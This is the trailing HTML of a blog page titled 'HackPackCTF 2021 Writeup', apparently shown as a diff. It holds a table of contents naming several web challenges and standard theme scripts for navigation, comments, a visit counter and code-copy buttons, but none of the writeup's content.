+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Intro"><span class="toc-number">1.</span> <span class="toc-text">Intro</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Intro-1"><span class="toc-number">2.</span> <span class="toc-text">Intro</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenges"><span class="toc-number"></span> <span class="toc-text">Challenges</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-%E2%80%9CN%E2%80%9Dot-%E2%80%9CG%E2%80%9Dam%E2%80%9DI%E2%80%9Dng-a%E2%80%9DN%E2%80%9Dymore-in-%E2%80%9CX%E2%80%9Dmas"><span class="toc-number">1.</span> <span class="toc-text">[Web]  “N”ot “G”am”I”ng a”N”ymore in “X”mas</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-All-about-resetting"><span class="toc-number">2.</span> <span class="toc-text">[Web] All about resetting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-Indead-v1"><span class="toc-number">3.</span> <span class="toc-text">[Web] Indead v1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-Yaml-2-Json"><span class="toc-number">4.</span> <span class="toc-text">[Web] Yaml-2-Json</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-Indead-v2"><span class="toc-number">5.</span> <span class="toc-text">[Web] Indead v2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference"><span class="toc-number">6.</span> <span class="toc-text">Reference</span></a></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+		  
+		  <!--此文件用来存放一些不方便取值的变量-->
+<!--思路大概是将值藏到重加载的区域内-->
+
+<script>
+  window.pdata={}
+  pdata.ispage=true;
+  pdata.postTitle="HackPackCTF 2021 Writeup";
+  pdata.commentPath="";
+  pdata.commentPlaceholder="";
+
+  var l_header=document.getElementById("l_header");
+  
+  l_header.classList.add("show");
+  
+</script>
+
+        </div>
+        
+  
+  <footer class="footer clearfix">
+    <br><br>
+    
+      
+        <div class='copyright'>
+        <p><a href="https://blog.jhyeon.dev/">Copyright © 2019-2021 JHYEON BLOG</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+        <a id="s-top" class="fas fa-arrow-up fa-fw" href="javascript:void(0)"></a>
+      </div>
+    </div>
+    <div>
+      <script>
+/************这个文件存放不需要重载的全局变量和全局函数*********/
+window.volantis={};
+window.volantis.loadcss=document.getElementById("loadcss");
+/******************** Pjax ********************************/
+function VPjax(){
+	this.list=[] // 存放回调函数
+	this.start=()=>{
+	  for(var i=0;i<this.list.length;i++){
+		this.list[i].run();
+	  }
+	}
+	this.push=(fn,name)=>{
+		var f=new PjaxItem(fn,name);
+		this.list.push(f);
+	}
+	// 构造一个可以run的对象
+	function PjaxItem(fn,name){
+		// 函数名称
+		this.name = name || fn.name
+		// run方法
+		this.run=()=>{
+			fn()
+		}
+	}
+}
+volantis.pjax={}
+volantis.pjax.method={
+	complete: new VPjax(),
+	error: new VPjax(),
+	send: new VPjax()
+}
+volantis.pjax={
+	...volantis.pjax,
+	push: volantis.pjax.method.complete.push,
+	error: volantis.pjax.method.error.push,
+	send: volantis.pjax.method.send.push
+}
+/********************脚本懒加载函数********************************/
+// 已经加入了setTimeout
+function loadScript(src, cb) {
+	setTimeout(function() {
+		var HEAD = document.getElementsByTagName('head')[0] || document.documentElement;
+		var script = document.createElement('script');
+		script.setAttribute('type','text/javascript');
+		if (cb) script.onload = cb;
+		script.setAttribute('src', src);
+		HEAD.appendChild(script);
+	});
+}
+//https://github.com/filamentgroup/loadCSS
+var loadCSS = function( href, before, media, attributes ){
+	var doc = window.document;
+	var ss = doc.createElement( "link" );
+	var ref;
+	if( before ){
+		ref = before;
+	}
+	else {
+		var refs = ( doc.body || doc.getElementsByTagName( "head" )[ 0 ] ).childNodes;
+		ref = refs[ refs.length - 1];
+	}
+	var sheets = doc.styleSheets;
+	if( attributes ){
+		for( var attributeName in attributes ){
+			if( attributes.hasOwnProperty( attributeName ) ){
+				ss.setAttribute( attributeName, attributes[attributeName] );
+			}
+		}
+	}
+	ss.rel = "stylesheet";
+	ss.href = href;
+	ss.media = "only x";
+	function ready( cb ){
+		if( doc.body ){
+			return cb();
+		}
+		setTimeout(function(){
+			ready( cb );
+		});
+	}
+	ready( function(){
+		ref.parentNode.insertBefore( ss, ( before ? ref : ref.nextSibling ) );
+	});
+	var onloadcssdefined = function( cb ){
+		var resolvedHref = ss.href;
+		var i = sheets.length;
+		while( i-- ){
+			if( sheets[ i ].href === resolvedHref ){
+				return cb();
+			}
+		}
+		setTimeout(function() {
+			onloadcssdefined( cb );
+		});
+	};
+	function loadCB(){
+		if( ss.addEventListener ){
+			ss.removeEventListener( "load", loadCB );
+		}
+		ss.media = media || "all";
+	}
+	if( ss.addEventListener ){
+		ss.addEventListener( "load", loadCB);
+	}
+	ss.onloadcssdefined = onloadcssdefined;
+	onloadcssdefined( loadCB );
+	return ss;
+};
+</script>
+<script>
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14/css/all.min.css", window.volantis.loadcss);
+  
+  
+  loadCSS("https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css", window.volantis.loadcss);
+  
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css", window.volantis.loadcss);
+  
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@10.5.0/styles/stackoverflow-dark.css", window.volantis.loadcss);
+  
+</script>
+<!-- required -->
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5/dist/jquery.min.js"></script>
+
+<script>
+  function pjax_fancybox() {
+    $(".md .gallery").find("img").each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".md .gallery").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  function SCload_fancybox() {
+    if ($(".md .gallery").find("img").length == 0) return;
+    loadCSS("https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css", document.getElementById("loadcss"));
+    loadScript('https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js', pjax_fancybox)
+  };
+  $(function () {
+    SCload_fancybox();
+  });
+  function Pjax_SCload_fancybox(){
+	if (typeof $.fancybox == "undefined") {
+	 SCload_fancybox();
+    } else {
+	 pjax_fancybox();
+    }
+  }
+  volantis.pjax.push(Pjax_SCload_fancybox)
+  volantis.pjax.send(()=>{
+      if (typeof $.fancybox != "undefined") {
+        $.fancybox.close();    // 关闭弹窗
+      }
+  },'fancybox')
+</script>
+
+
+<!-- internal -->
+
+
+
+
+<script>
+  function loadIssuesJS() {
+    if ($(".md").find(".issues-api").length == 0) return;
+	
+	  loadScript('/js/issues.js');
+	
+  };
+  $(function () {
+    loadIssuesJS();
+  });
+  volantis.pjax.push(()=>{
+	if (typeof IssuesAPI == "undefined") {
+	  loadIssuesJS();
+	}
+  },"IssuesJS")
+</script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
+
+
+  
+
+<script>
+  window.FPConfig = {
+	delay: 0,
+	ignoreKeywords: [],
+	maxRPS: 5,
+	hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"></script>
+
+
+
+
+
+  <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+    var clipboard = new ClipboardJS('.btn-copy', {
+        target: function (trigger) {
+            return trigger.nextElementSibling
+        }
+    });
+    function wait(callback, seconds) {
+        var timelag = null;
+        timelag = window.setTimeout(callback, seconds)
+    }
+    function pjax_initCopyCode() {
+		if($(".highlight .code pre").length+$(".article pre code").length==0)return;
+        var copyHtml = '';
+        copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+        copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
+        copyHtml += '</button>';
+        $(".highlight .code pre").before(copyHtml);
+        $(".article pre code").before(copyHtml);
+        clipboard.off('success').on('success', function (e) {
+            let $btn = $(e.trigger);
+            $btn.addClass('copied');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-check-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPIED';
+            wait(function () {
+                $icon.removeClass('fa-check-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        });
+        clipboard.off('error').on('error', function (e) {
+            e.clearSelection();
+            let $btn = $(e.trigger);
+            $btn.addClass('copy-failed');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-times-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPY FAILED';
+            wait(function () {
+                $icon.removeClass('fa-times-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        })
+    }
+    $(function () {
+        pjax_initCopyCode()
+    });
+	volantis.pjax.push(pjax_initCopyCode)
+</script>
+
+
+
+
+
+
+
+
+  <script>
+  const disqus_shortname = 'blog-jhyeon-xyz';
+  const autoload = 'true';
+  const global_url = 'https://blog.jhyeon.dev';  //  must use an absolute URL; relative URLs won’t work.
+
+  function checkDisqus() {
+    // 正在检查 Disqus 能否访问...
+    const runcheck = (domain) => {
+      return new Promise((resolve, reject) => {
+        const img = new Image;
+        const timeout = setTimeout(() => {
+          img.onerror = img.onload = null;
+          reject();
+        }, 3000);
+        img.onerror = () => {
+          clearTimeout(timeout);
+          reject();
+        }
+        img.onload = () => {
+          clearTimeout(timeout);
+          resolve();
+        }
+        img.src = `https://${domain}/favicon.ico?${+(new Date)}=${+(new Date)}`;
+      })
+    }
+    return Promise.all([
+      runcheck('blog-jhyeon-xyz.disqus.com')
+    ]).then(loadDisqus,showError);
+  }
+
+  function loadDisqus() {
+    let path = pdata.commentPath;
+    if (path.length == 0) {
+      let defaultPath = '';
+      path = defaultPath || decodeURI(window.location.pathname);
+    }
+    if (window.DISQUS) {
+      window.DISQUS.reset({
+        reload: true,
+        config() {
+          this.page.identifier = global_url + path;
+          this.page.url = global_url + path;
+        }
+      });
+    } else {
+      window.disqus_config = function () {
+        this.page.url = global_url + path;
+        this.page.identifier = global_url + path;
+      };
+      let d = document, s = d.createElement('script');
+      s.async = true;
+      s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    }
+  }
+
+  // 加载错误
+  function showError() {
+    $('#loading-comments').hide();
+    $('#notShowDisqus').show();
+  }
+
+  // 点击了加载
+  function needLoadDisqus() {
+    checkDisqus();
+    $('#load-btns').hide();
+    $('#loading-comments').show();
+  }
+
+  // pjax 重载
+  function pjax_disqus() {
+    // 排除当前页面不存在评论框的情形
+    if ($('#disqus_thread').length == 0) {return}
+    // 如果 DISQUS 已被实例化，则可直接加载
+    if (window.DISQUS) {
+      $('#load-btns').hide();
+      $('#notShowDisqus').hide();
+      $('#loading-comments').hide();
+      loadDisqus();
+    } else if (autoload == 'true') {
+      // 设置自动加载但是上个页面加载失败了
+      needLoadDisqus();
+    }
+  }
+  if (autoload == 'true') {
+    needLoadDisqus();
+  }
+  volantis.pjax.push(pjax_disqus);
+</script>
+
+
+
+
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+<!-- optional -->
+
+  <script>
+const SearchServiceimagePath="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@master/img/";
+const ROOT =  ("/" || "/").endsWith('/') ? ("/" || "/") : ("//" || "/" );
+
+$('.input.u-search-input').one('focus',function(){
+	
+		loadScript('/js/search/hexo.js',setSearchService);
+	
+})
+
+function listenSearch(){
+  
+    customSearch = new HexoSearch({
+      imagePath: SearchServiceimagePath
+    });
+  
+}
+function setSearchService() {
+	listenSearch();
+	
+}
+</script>
+
+
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script>
+
+<script type="text/javascript">
+$(function () {
+  Waves.attach('.flat-btn', ['waves-button']);
+  Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+  Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+  Waves.attach('.flat-box', ['waves-block']);
+  Waves.attach('.float-box', ['waves-block', 'waves-float']);
+  Waves.attach('.waves-image');
+  Waves.init();
+});
+</script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@2/js/comment_typing.js"></script>
+
+
+
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	});
+},"highlightjs")
+</script>
+
+
+
+  <script defer>
+
+  const LCCounter = {
+    app_id: 'u9j57bwJod4EDmXWdxrwuqQT-MdYXbMMI',
+    app_key: 'jfHtEKVE24j0IVCGHbvuFClp',
+    custom_api_server: '',
+
+    // 查询存储的记录
+    getRecord(Counter, url, title) {
+      return new Promise(function (resolve, reject) {
+        Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({url})))
+          .then(resp => resp.json())
+          .then(({results, code, error}) => {
+            if (code === 401) {
+              throw error;
+            }
+            if (results && results.length > 0) {
+              var record = results[0];
+              resolve(record);
+            } else {
+              Counter('post', '/classes/Counter', {url, title: title, times: 0})
+                .then(resp => resp.json())
+                .then((record, error) => {
+                  if (error) {
+                    throw error;
+                  }
+                  resolve(record);
+                }).catch(error => {
+                console.error('Failed to create', error);
+                reject(error);
+              });
+            }
+          }).catch((error) => {
+          console.error('LeanCloud Counter Error:', error);
+          reject(error);
+        });
+      })
+    },
+
+    // 发起自增请求
+    increment(Counter, incrArr) {
+      return new Promise(function (resolve, reject) {
+        Counter('post', '/batch', {
+          "requests": incrArr
+        }).then((res) => {
+          res = res.json();
+          if (res.error) {
+            throw res.error;
+          }
+          resolve(res);
+        }).catch((error) => {
+          console.error('Failed to save visitor count', error);
+          reject(error);
+        });
+      });
+    },
+
+    // 构建自增请求体
+    buildIncrement(objectId) {
+      return {
+        "method": "PUT",
+        "path": `/1.1/classes/Counter/${ objectId }`,
+        "body": {
+          "times": {
+            '__op': 'Increment',
+            'amount': 1
+          }
+        }
+      }
+    },
+
+    // 校验是否为有效的 UV
+    validUV() {
+      var key = 'LeanCloudUVTimestamp';
+      var flag = localStorage.getItem(key);
+      if (flag) {
+        // 距离标记小于 24 小时则不计为 UV
+        if (new Date().getTime() - parseInt(flag) <= 86400000) {
+          return false;
+        }
+      }
+      localStorage.setItem(key, new Date().getTime().toString());
+      return true;
+    },
+
+    addCount(Counter) {
+      var enableIncr = '' === 'true' && window.location.hostname !== 'localhost';
+      enableIncr = true;
+      var getterArr = [];
+      var incrArr = [];
+      // 请求 PV 并自增
+      var pvCtn = document.querySelector('#lc-sv');
+      if (pvCtn || enableIncr) {
+        var pvGetter = this.getRecord(Counter, 'https://blog.jhyeon.dev' + '/#lc-sv', 'Visits').then((record) => {
+          incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-sv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + 1;
+              if (pvCtn) {
+                pvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(pvGetter);
+      }
+
+      // 请求 UV 并自增
+      var uvCtn = document.querySelector('#lc-uv');
+      if (uvCtn || enableIncr) {
+        var uvGetter = this.getRecord(Counter, 'https://blog.jhyeon.dev' + '/#lc-uv', 'Visitors').then((record) => {
+          var vuv = this.validUV();
+          vuv && incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-uv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + (vuv ? 1 : 0);
+              if (uvCtn) {
+                uvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(uvGetter);
+      }
+
+      // 请求文章的浏览数，如果是当前页面就自增
+      var allPV = document.querySelectorAll('#lc-pv');
+      if (allPV.length > 0 || enableIncr) {
+        for (i = 0; i < allPV.length; i++) {
+          let pv = allPV[i];
+          let title = pv.getAttribute('data-title');
+          var url = 'https://blog.jhyeon.dev' + pv.getAttribute('data-path');
+          if (url) {
+            var viewGetter = this.getRecord(Counter, url, title).then((record) => {
+              // 是当前页面就自增
+              let curPath = window.location.pathname;
+              if (curPath.includes('index.html')) {
+                curPath = curPath.substring(0, curPath.lastIndexOf('index.html'));
+              }
+              if (pv.getAttribute('data-path') == curPath) {
+                incrArr.push(this.buildIncrement(record.objectId));
+              }
+              if (pv) {
+                var ele = pv.querySelector('#lc-pv #number');
+                if (ele) {
+                  if (pv.getAttribute('data-path') == curPath) {
+                    ele.innerText = (record.times || 0) + 1;
+                  } else {
+                    ele.innerText = record.times || 0;
+                  }
+                  pv.style.display = 'inline';
+                }
+              }
+            });
+            getterArr.push(viewGetter);
+          }
+        }
+      }
+
+      // 如果启动计数自增，批量发起自增请求
+      if (enableIncr) {
+        Promise.all(getterArr).then(() => {
+          incrArr.length > 0 && this.increment(Counter, incrArr);
+        })
+      }
+
+    },
+
+
+    fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${ api_server }/1.1${ url }`, {
+          method,
+          headers: {
+            'X-LC-Id': this.app_id,
+            'X-LC-Key': this.app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      this.addCount(Counter);
+    },
+
+    refreshCounter() {
+      var api_server = this.app_id.slice(-9) !== '-MdYXbMMI' ? this.custom_api_server : `https://${ this.app_id.slice(0, 8).toLowerCase() }.api.lncldglobal.com`;
+      if (api_server) {
+        this.fetchData(api_server);
+      } else {
+        fetch('https://app-router.leancloud.cn/2/route?appId=' + this.app_id)
+          .then(resp => resp.json())
+          .then(({api_server}) => {
+            this.fetchData('https://' + api_server);
+          });
+      }
+    }
+
+  };
+
+  LCCounter.refreshCounter();
+
+  document.addEventListener('pjax:complete', function () {
+    LCCounter.refreshCounter();
+  });
+</script>
+
+
+
+
+
+
+
+
+
+
+<script>
+function listennSidebarTOC() {
+  const navItems = document.querySelectorAll(".toc li");
+  if (!navItems.length) return;
+  const sections = [...navItems].map((element) => {
+    const link = element.querySelector(".toc-link");
+    const target = document.getElementById(
+      decodeURI(link.getAttribute("href")).replace("#", "")
+    );
+    link.addEventListener("click", (event) => {
+      event.preventDefault();
+      window.scrollTo({
+		top: target.offsetTop + 100,
+		
+	  });
+    });
+    return target;
+  });
+
+  function activateNavByIndex(target) {
+    if (target.classList.contains("active-current")) return;
+
+    document.querySelectorAll(".toc .active").forEach((element) => {
+      element.classList.remove("active", "active-current");
+    });
+    target.classList.add("active", "active-current");
+    let parent = target.parentNode;
+    while (!parent.matches(".toc")) {
+      if (parent.matches("li")) parent.classList.add("active");
+      parent = parent.parentNode;
+    }
+  }
+
+  function findIndex(entries) {
+    let index = 0;
+    let entry = entries[index];
+    if (entry.boundingClientRect.top > 0) {
+      index = sections.indexOf(entry.target);
+      return index === 0 ? 0 : index - 1;
+    }
+    for (; index < entries.length; index++) {
+      if (entries[index].boundingClientRect.top <= 0) {
+        entry = entries[index];
+      } else {
+        return sections.indexOf(entry.target);
+      }
+    }
+    return sections.indexOf(entry.target);
+  }
+
+  function createIntersectionObserver(marginTop) {
+    marginTop = Math.floor(marginTop + 10000);
+    let intersectionObserver = new IntersectionObserver(
+      (entries, observe) => {
+        let scrollHeight = document.documentElement.scrollHeight + 100;
+        if (scrollHeight > marginTop) {
+          observe.disconnect();
+          createIntersectionObserver(scrollHeight);
+          return;
+        }
+        let index = findIndex(entries);
+        activateNavByIndex(navItems[index]);
+      },
+      {
+        rootMargin: marginTop + "px 0px -100% 0px",
+        threshold: 0,
+      }
+    );
+    sections.forEach((element) => {
+      element && intersectionObserver.observe(element);
+    });
+  }
+  createIntersectionObserver(document.documentElement.scrollHeight);
+}
+
+document.addEventListener("DOMContentLoaded", listennSidebarTOC);
+document.addEventListener("pjax:success", listennSidebarTOC);
+</script>
+
+<!-- more -->
+
+ 
+	   
+	    
+
+
+<script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script>
+
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          "#l_cover",
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      //window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+
+      volantis.$switcher.removeClass('active'); // 关闭移动端激活的搜索框
+      volantis.$header.removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      volantis.$wrapper.removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      volantis.$topBtn.unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+	  // 使用 volantis.pjax.send 方法传入pjax:send回调函数 参见layout/_partial/scripts/global.ejs
+	  volantis.pjax.method.send.start();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+      try{
+		// 使用 volantis.pjax.push 方法传入重载函数 参见layout/_partial/scripts/global.ejs
+		volantis.pjax.method.complete.start();
+      } catch (e) {
+        console.log(e);
+      }
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+	  // 使用 volantis.pjax.error 方法传入pjax:error回调函数 参见layout/_partial/scripts/global.ejs
+	  volantis.pjax.method.error.start();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+ 
+	  
+    </div>
+  </body>
+</html>
